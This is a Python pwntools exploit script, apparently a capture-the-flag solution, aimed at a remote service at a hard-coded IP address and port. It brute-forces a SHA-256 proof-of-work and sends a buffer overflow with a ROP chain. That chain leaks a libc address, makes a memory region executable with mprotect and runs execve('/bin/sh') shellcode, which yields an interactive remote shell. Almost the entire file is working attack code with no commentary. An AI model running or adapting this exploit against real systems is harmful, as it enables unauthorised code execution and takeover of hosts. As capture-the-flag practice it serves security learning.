from pwn import *
import hashlib
from string import digits,letters
import random


context.arch = "amd64"

#r = process(["./bs"])

r = remote("47.91.226.78", 10005)


data = r.recvline()
substr = data.split(')')[0].split('+')[1]
ans = data.split()[-1].strip()

total = digits+letters
total*=4
total = list(total)
print total
count = 0
while True:
	count +=1
	if count %10000 == 0:
		print count
	sol = "".join(random.sample(total,4))
	if hashlib.sha256( sol+substr).hexdigest() == ans:
		print "OK"
		r.sendline(sol)
		break






addr = 0x00602100




shell=asm("""
mov rbx,0x0068732f6e69622f
push rbx
push rsp
pop rdi
xor rsi,rsi
push rsi
pop rdx
push rdx
pop rax
mov al,0x3b
syscall
mov al,0x3c
xor rdi,rdi
syscall
""")


#0x0000000000400c03 : pop rdi ; ret

payload = flat([
0x400c03,
0x601fb0,
0x4007c0,
0x400bfa,
0x0,
0x1,
0x601fd0,
0x8+len(shell),
addr,
0x0,
0x400be0,
0x0,
0x0,
0x1,
addr,
0x7,
0x1000,
0x602000,
0x400be0,
0x0,
0x0,
0x0,
0x0,
0x0,
0x0,
0x0,
addr+0x8
])

payload = "a"*0x1018+payload
payload = payload.ljust(0x1800,'a')

r.sendlineafter("?",str(len(payload)))
r.send(payload)

r.recvline()
r.recvline()

libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
mprotect = 0x101770+libc
print hex(libc)


r.send(p64(mprotect)+shell)

r.interactive()
